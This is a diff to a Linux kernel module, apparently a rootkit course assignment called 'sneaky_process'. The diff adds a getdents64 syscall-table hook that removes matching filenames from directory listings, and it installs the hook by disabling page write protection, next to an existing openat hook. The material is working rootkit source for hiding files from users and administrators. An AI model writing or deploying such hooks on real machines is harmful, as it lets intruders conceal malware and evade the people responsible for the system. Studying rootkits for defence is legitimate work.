@@ -7,9 +7,18 @@
 #include <asm/unistd.h>        // for system call constants
 #include <linux/kallsyms.h>
 #include <asm/page.h>
+#include <linux/dirent.h>
+
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
+#define FILE_NAME "sneaky_process"
+
+
+static char *mystring = "";
+module_param(mystring, charp, 0);
+MODULE_PARM_DESC(mystring, "A character string");
+
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -44,6 +53,38 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+/* sneaky start */
+asmlinkage int (*original_getdents64) (struct pt_regs *);
+
+asmlinkage int sys_getdents64_hook(struct pt_regs *regs)
+{       //int fd = regs->di;
+        struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
+        //int count = regs->dx;
+
+        int rtn;
+        struct linux_dirent64 *cur = dirp;
+        int i = 0;
+        rtn = original_getdents64(regs);
+        while (i < rtn) {
+                if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
+                        int reclen = cur->d_reclen;
+                        char *next_rec = (char *)cur + reclen;
+                        int len = (void*)dirp + rtn - (void*)next_rec;
+                        memmove(cur, next_rec, len);
+                        rtn -= reclen;
+                        continue;
+                }
+                i += cur->d_reclen;
+                cur = (struct linux_dirent64 *) ((char*)dirp + i);
+        }
+        return rtn;
+}
+/* sneaky end */
+
+/* 2 start */
+
+/* 2 end*/
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -58,14 +99,14 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
-  
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];/* modified */
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
 
   // You need to replace other system calls you need to hack here
-  
+  sys_call_table[__NR_getdents64] = (unsigned long)sys_getdents64_hook;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -83,6 +124,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;/* modified */
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
